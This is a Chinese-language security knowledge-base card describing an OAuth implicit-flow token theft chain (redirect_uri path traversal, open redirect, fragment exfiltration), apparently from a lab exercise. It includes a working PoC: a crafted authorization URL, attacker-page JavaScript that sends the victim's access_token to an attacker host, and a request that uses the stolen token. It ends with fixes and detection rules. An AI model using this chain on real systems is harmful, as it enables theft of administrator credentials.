---
id: web-generic-oauth-token-theft-open-redirect-fragment
title: OAuth 隐式流程 access_token 窃取：redirect_uri 路径穿越 + /post/next 开放重定向 + JS 把 fragment token 外带
type: scenario
domain: web
path: web/generic/oauth
technique: oauth-implicit-token-theft-path-traversal-open-redirect
tags:
- web
- oauth
- implicit-flow
- open-redirect
- path-traversal
- token-theft
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V281
  verified_at: '2026-11-08T05:07:36+08:00'
  notes: '已对照原文 Lab: Stealing OAuth access tokens via an open redirect 与图45-61核对：redirect_uri=https://baidu.com 返回 400（图50），加 /oauth-callback/../post?postId=1 后 302 且 Location 带 #access_token（图51），/post/next?path=https://baidu.com 302 外跳（图54），最终两阶段 JS 把 victim 的 #access_token 写入 /?access_token=... 日志（图59/61）。卡内路径穿越+开放重定向+fragment 外带链与原文一致。与 postmessage-proxy 卡共享 redirect_uri 穿越前置但外带通道不同，dup-scan pair 裁决为保留两张（非同一链）。未设 affected_versions。未执行靶场。'
url: /docs/web/generic/oauth/web-generic-oauth-token-theft-open-redirect-fragment/
draft: false
kb_aliases:
- OAuth access_token 窃取
- redirect_uri 路径穿越
- 开放重定向 OAuth
- fragment token 外带
- /oauth-callback/../post/next
- implicit flow token theft
---

## 一句话结论

OAuth 隐式流程把 `access_token` 放在回调 URL 的 fragment 里；当 `redirect_uri` 只校验 `/oauth-callback` 前缀时，可用 `/oauth-callback/../post/next?path=<攻击者>` 路径穿越到一个开放重定向（`path` 参数），浏览器携带 fragment 跟随 302 到攻击者页面，攻击者再用 JS 读取 `location.hash` 并把 token 写进请求路径，从访问日志中取得管理员的 access_token。

## 原理

- 隐式流程（`response_type=token`）的响应是 `302 Location: https://target/oauth-callback#access_token=...&expires_in=...&token_type=Bearer&scope=...`。fragment 不会随 HTTP 请求发送给服务器，但浏览器在跟随重定向时会保留 fragment。
- `redirect_uri` 校验只检查"是否以 `/oauth-callback` 开头"或"路径前缀匹配"，没有对路径做规范化；`/oauth-callback/../post?postId=1` 在服务端 302 时被解析为 `/post?postId=1`，通过校验。
- `/post/next?path=<URL>` 是一个开放重定向：服务端直接 `302 Location: <path 参数>`（本例 `path=https://baidu.com` 也被接受）。把 `path` 设为攻击者页面，OAuth 的 302 链最终落到攻击者域名，且 fragment（含 token）随浏览器跳转保留。
- 攻击者页面首次加载时没有 hash，于是用 JS 跳转到构造好的 OAuth 授权 URL 启动流程；当 OAuth 带着 token 回到攻击者页面时，页面检测到 hash，把 `window.location.hash` 拼到 `/?` 后面，使 token 进入 HTTP 请求的查询串，从而出现在攻击者服务器的访问日志里（fragment 本身不会发给服务器，必须改写为 query）。
- token 是管理员 OAuth 会话的 bearer 凭证，攻击者用它调用 `/me` 即可取得管理员的 API key。

## 触发条件

- OAuth 服务使用隐式流程（`response_type=token`），且 `redirect_uri` 校验只做前缀/包含匹配，未规范化路径。
- 客户端站点存在开放重定向（本例 `/post/next?path=`），能把用户带到任意外部 URL。
- 管理员会访问攻击者提供的页面，且浏览器在 OAuth 服务处于登录状态。
- 攻击者能读取自己 Web 服务器的访问日志（或页面有回显）。

## 利用步骤

1. 走一遍自己的登录，抓取 `/auth?client_id=...&redirect_uri=https://target/oauth-callback&response_type=token&nonce=...&scope=...`，确认响应是 `302` 且 `Location` 带 `#access_token=...`。
2. 确认 `redirect_uri` 可用路径穿越：把值改为 `https://target/oauth-callback/../post?postId=1`，观察响应 `302 Location: /post?postId=1#access_token=...`。
3. 确认 `/post/next?path=` 是开放重定向：请求 `GET /post/next?path=https://baidu.com`，响应 `302 Location: https://baidu.com`。
4. 组合授权 URL：`redirect_uri=https://target/oauth-callback/../post/next?path=https://attacker/exploit&response_type=token&...`。
5. 在攻击者页面放置两阶段 JS：无 hash 时跳转到第 4 步的授权 URL；有 hash 时把 `location.hash` 改写为查询串（如 `/?access_token=...`），让服务器日志记录 token。
6. 把攻击者页面 URL 发给管理员（exploit server 的 Deliver），查看日志中的 `/?access_token=...`。
7. 用该 token 调用 `GET /me`（`Authorization: Bearer <token>`）取得管理员 API key。

## PoC

组合授权 URL：

```text
https://oauth-server/auth?client_id=<CLIENT_ID>&redirect_uri=https://target/oauth-callback/../post/next?path=https://attacker/exploit&response_type=token&nonce=-1287498302&scope=openid%20profile%20email
```

攻击者页面 JS：

```html
<script>
if (!document.location.hash) {
  window.location = 'https://oauth-server/auth?client_id=<CLIENT_ID>&redirect_uri=https://target/oauth-callback/../post/next?path=https://attacker/exploit&response_type=token&nonce=-1287498302&scope=openid%20profile%20email';
} else {
  window.location = '/?' + document.location.hash.substr(1);
}
</script>
```

访问日志（受害者浏览器落地后）：

```text
10.0.3.226 - - "GET /?access_token=oTuM8uWt8sUpsx1lkF7Cusuy2kO17F3Oyk7oTlHjlee&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email HTTP/1.1" 200
```

使用 token：

```http
GET /me HTTP/1.1
Host: target
Authorization: Bearer <stolen_access_token>
```

## 变体与关联

- 变体：`redirect_uri` 校验的其他绕过（`@`、编码、大小写、追加 `?`/`#`、子域名）也可把 token 导向攻击者域名。
- 变体：如果站点没有开放重定向，可用 HTML 注入/XSS 在回调页读取 `location.hash` 外带（fragment 不经过服务器）。
- 变体：授权码流程同理，但 code 在 query 中，攻击者服务器直接可从日志取得（见任意 redirect_uri 卡）。
- 关联：[[web-generic-oauth-arbitrary-redirect-uri-code-theft]]（任意 redirect_uri 直接收 code）。
- 关联：[[web-generic-oauth-token-theft-postmessage-proxy-page]]（用同站代理页 postMessage 泄露 token 的另一种方式）。
- 关联：[[web-generic-oauth-postmessage-code-theft-sso-bind-xxe]]（redirect_uri 前缀校验 + postMessage 窃取 code）。

## 检测与防御

- 修复：`redirect_uri` 与注册值精确匹配，并在匹配前做 URL 规范化（解析并消除 `..`、拒绝编码绕过、禁止相对路径）。
- 修复：消除站点内开放重定向；`/post/next` 的 `path` 只允许站内相对路径白名单。
- 修复：隐式流程迁移到授权码 + PKCE；避免把 token 放在 fragment/URL 中；如需前端存储，使用内存 + 短时效。
- 加固：CSP 限制外连、`frame-ancestors` 限制被第三方嵌入；对 OAuth 回调页做 Referer/Origin 校验。
- 检测：`redirect_uri` 含 `..`、编码斜杠、外部域名；`/post/next` 等跳转接口的 `path` 指向外部域名；访问日志出现带 `access_token` 的查询串（说明 token 已被写入 URL）。
- 检测：同一条 OAuth 授权在短时间内被不同 IP 使用；管理员 token 在非预期 IP 调用 `/me`/API。
